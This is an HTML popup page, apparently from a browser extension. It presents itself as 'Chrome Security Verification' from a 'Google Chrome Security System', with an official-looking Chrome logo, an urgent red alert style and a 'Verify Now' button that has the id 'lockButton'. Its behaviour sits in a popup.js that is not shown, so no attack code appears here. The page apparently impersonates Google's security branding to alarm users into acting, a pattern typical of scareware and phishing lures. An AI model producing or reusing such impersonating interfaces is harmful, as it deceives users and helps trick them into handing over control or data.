<!DOCTYPE html>
<html>
<head>
    <title>Chrome Security Verification</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            width: 280px;
            padding: 15px;
            margin: 0;
            color: #333;
        }
        .header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            border-bottom: 1px solid #eaeaea;
            padding-bottom: 10px;
        }
        .logo {
            width: 32px;
            height: 32px;
            margin-right: 10px;
        }
        h3 {
            margin: 0;
            color: #d32f2f;
            font-weight: 700;
        }
        button {
            background-color: #d32f2f;
            color: white;
            border: none;
            padding: 12px 16px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            font-family: 'Roboto', sans-serif;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            transition: background-color 0.3s;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }
        button:hover {
            background-color: #b71c1c;
        }
        .alert-banner {
            background-color: #fef0f0;
            border-left: 4px solid #f44336;
            padding: 10px 15px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            border-radius: 4px;
            font-size: 13px;
        }
        
        .alert-banner span {
            color: #d32f2f;
            font-weight: 500;
            margin-left: 10px;
        }
        
        .warning-icon {
            width: 18px;
            height: 18px;
        }
        
        .status {
            margin-bottom: 15px;
            padding: 10px;
            border-radius: 4px;
            background-color: #e8f0fe;
            border-left: 3px solid #1a73e8;
            font-weight: 500;
            color: #333;
        }
        .locked {
            color: #d32f2f;
        }
        .unlocked {
            color: #388e3c;
        }
        .warning {
            margin-top: 15px;
            padding: 8px;
            background-color: #fff3e0;
            border-left: 3px solid #ff9800;
            font-size: 11px;
            color: #e65100;
            line-height: 1.4;
        }
        
        .footer {
            margin-top: 15px;
            font-size: 10px;
            color: #777;
            text-align: center;
            border-top: 1px solid #eaeaea;
            padding-top: 10px;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="images/chrome_official.svg" alt="Chrome" class="logo">
        <h3>Chrome Security Verification</h3>
    </div>
    <div class="status" id="statusMessage">Checking security status...</div>
    <button id="lockButton">Verify Now</button>
    <div class="footer">
        Google Chrome Security System
    </div>
    <script src="popup.js"></script>
</body>
</html>
